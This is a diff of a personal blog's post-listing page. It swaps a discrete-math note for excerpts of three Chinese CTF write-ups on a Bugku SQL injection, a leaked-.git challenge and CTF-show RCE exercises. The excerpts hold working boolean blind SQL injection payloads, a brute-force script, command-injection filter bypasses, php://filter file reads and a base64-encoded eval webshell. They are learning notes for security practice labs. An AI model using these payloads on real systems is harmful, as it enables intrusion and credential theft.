@@ -123,21 +123,114 @@ November 9, 2021&nbsp;·&nbsp;3 min&nbsp;·&nbsp;Yiming Shen
 <article class=post-entry>
 <header class=entry-header>
 <h2>
-离散数学笔记-命题逻辑的推理理论
+Bugku-SQL注入-WriteUP
 </h2>
 </header>
 <section class=entry-content>
-<p>前言 所谓推理是指从前提出发推出结论的思维过程，而前提是已知的命题公式集合，结论是从前提出发应用推理规则推出的命题公式。
-定理3.1 命题公式$A_1,A_2,\cdots,A_k$推出B的推理正确当且仅当 $$ A_1\wedge A_2,\wedge \cdots,\wedge A_k \to B $$ 为重言式。
-今后把推理的形式结构写成: $$ 前提：A_1,A_2,\cdots,A_k\\ 结论：B $$ 并根据判断定理3.1的蕴含式是否是重言式来确定推理是否正确。根据前2章的讨论，判断是否为重言式有下面3种方法：
-真值表法 等值演算法 主析取范式法 常用重言蕴含式（推理定律） $$ (A\to B)\wedge A \Rightarrow B \qquad 假言推理\\ (A\to B)\wedge \neg B\Rightarrow \neg A\qquad 拒取式\\ (A\vee B)\wedge \neg B \Rightarrow A \qquad 析取三段论\\ (A\to B)\wedge (B\to C)\Rightarrow (A\to C) \qquad 假言三段论\\ $$
-推理证明格式 例3.3 在自然推理系统P中构造下面推理的证明。 前提：$$P\vee q,q\to r,p\to s,\neg s$$...</p>
+<p>题目网址：sql注入
+一个很正经的界面，有实战那味了。
+上来先尝试经典组合：
+admin~password
+很幸运，用户名猜中了。
+利用单引号检测是否存在SQL注入
+admin' or 1 = 1
+报非法字符，说明存在字符过滤，我们找一下未被过滤的可用字符：
+'
+or
+&lt;>(不等号)
+#
+()
+空格可用括号代替，等号可用相反的不等号
+先尝试是否存在布尔注入：
+成功，用户名存在注入~
+之后就是利用有错误反馈的布尔盲注语句进行爆密码（因为已知用户名）
+select password from admin 因为屏蔽了逗号，所以left、substr、if函数基本无法使用，我们用ascii和mid函数构造payload
+1'or((ascii(mid((select(password)from(admin))from(1))))&lt;>9)or(1)# 使用burp爆破，从1开始挨个尝试，结果是以md5的形式存储在库中的，手动爆破很困难
+我们尝试下集束炸弹，让两个参数都作为目标
+第一组payload为0-9的两位数组合，第二组payload为a-z和0-9的ASCII码
+爆破成功了。。。
+接下来就是把各组数据记下来，转换成字母和数字，得到了一串md5密码：
+4dcc88f8f1bc05e7c2ad1a60288481a2
+去md5破解站破解一下，成功解出密码：
+bugkuctf
+结束了……
+反思 自动化程度不够高，学的python要用上，不要有脚本小子思想。
+贴一组大神的python自动脚本，以供学习
+#布尔盲注不仅仅是在密码正确和密码错误两种情况下，比如你输入账户，可能出现“账户不存在”和“存在”两种情况，这也是布尔。 import requests import string,hashlib url = 'http://114.67.246.176:19665/' sss = string.digits + (string.ascii_lowercase) a = '' for i in range(1, 50): flag = 0 for j in sss: payload = "admin'^((ascii(mid((select(password)from(admin))from(%s))))&lt;>%s)^1#" % (i, ord(j)) #屏蔽了","，改用mid()函数，from表示起始位置 #ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit #&lt;>表示不等号 #^表示异或 payload2= "admin123'or((ascii(mid((select(password)from(admin))from(%s))))&lt;>%s)#"%(i,ord(j)) #由于没有屏蔽or，所以也可以用这个，可以形成一组布尔 payload3= "admin123'or((ascii(mid((select(database()))from(%s))))&lt;>%s)#"%(i,ord(j)) data = {'username': payload, 'password': 'admin'} res = requests....</p>
 </section>
 <footer class=entry-footer>
-October 9, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+October 24, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
 </footer>
-<a class=entry-link aria-label="post link to 离散数学笔记-命题逻辑的推理理论" href=https://shenyimings.github.io/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-ch03/></a>
+<a class=entry-link aria-label="post link to Bugku-SQL注入-WriteUP" href=https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/></a>
 </article>
+<article class=post-entry>
+<header class=entry-header>
+<h2>
+CNSS Recruit-Web Write UP
+</h2>
+</header>
+<section class=entry-content>
+<p>前言 躺在床上，不想动鼠标，那就先写写前言吧。
+这个CTF比赛是我打的第二场比较正规、完整的比赛。
+惨不忍睹，当然，作为刚入门的noob来说也可以接受。
+希望能通过笔记的整理消化新掌握的知识，道阻且长。
+[👶Baby]GitHacker 根据题目名，应该是考察Git泄露相关知识。
+关于工具Githack的使用和Python2/3的同时安装 使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为python2.exe，则在pws中输入python是运行python3，输入python2则是运行Python2.
+python2 .\GitHack.py http:\\x.x.x\.git 运行后即得到git目录。
+Git版本管理 这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。
+git log # 查看提交记录（版本号） git status # 查看本地修改记录 git reset --hard 目标版本号 # 退回目标版本号 git reset HEAD # 回退到最早版本 git checkout # 还原与版本记录不符的所有文件 git restore 目标文件名 # 还原与版本记录不符的目标文件 这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜CNSS而不是flag。
+其他Githack脚本 在CTF中推荐Git_Extract-master这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了git reset和git checkout的过程。
+[😃Easy]更坑的数学题 仅有的提示就是快速把结果提交，有可能会出现flag。
+第一反应是绕过和注入咯，尝试后无果。
+再观察续一秒按钮前端代码，发现是安慰剂按钮。。。
+那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：
+import requests import re # 正则表达式库 import string from requests.sessions import session url = 'http://81.68.109.40:30005/' session = requests....</p>
+</section>
+<footer class=entry-footer>
+October 21, 2021&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to CNSS Recruit-Web Write UP" href=https://shenyimings.github.io/post/14.cnss-recruit-web-write-up/></a>
+</article>
+<article class=post-entry>
+<header class=entry-header>
+<h2>
+RCE 远程命令执行漏洞
+</h2>
+</header>
+<section class=entry-content>
+<p>本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。
+Web 29 过滤了flag字样
+?c=system("cat f*");
+Web 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过
+echo `cat f\lag.ph\p`; 反引号可以执行系统命令
+Web 31 在cat被禁时，我们还可以采用如下命令
+1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器
+空格的代替符号：
+1.${IFS}
+2.$IFS$1
+3.${IFS
+4.%20
+5.&lt;和&lt;>重定向符
+6.%09
+构造本题payload
+?c=echo'more%09f*'; 其他题解：
+?c=eval($_GET[1]);&1=system('cat flag.php');嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");等价于system()。这个学到了！ Web 32 屏蔽了echo
+分号可以用?>代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。
+?c=include"$_GET[1]"?>&1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 &lt;?php $filename=$_GET['filename']; $content=$_GET['content']; file_put_contents($filename,"&lt;?php exit();".$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？
+我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。
+base64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
+?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 &lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !...</p>
+</section>
+<footer class=entry-footer>
+October 20, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to RCE 远程命令执行漏洞" href=https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/></a>
+</article>
+<footer class=page-footer>
+<nav class=pagination>
+<a class=next href=https://shenyimings.github.io/post/page/2/>Next Page »</a>
+</nav>
+</footer>
 </main><footer class=footer>
 <span>&copy; 2021 <a href=https://shenyimings.github.io/>Yiming</a></span>
 <span>&#183;</span>
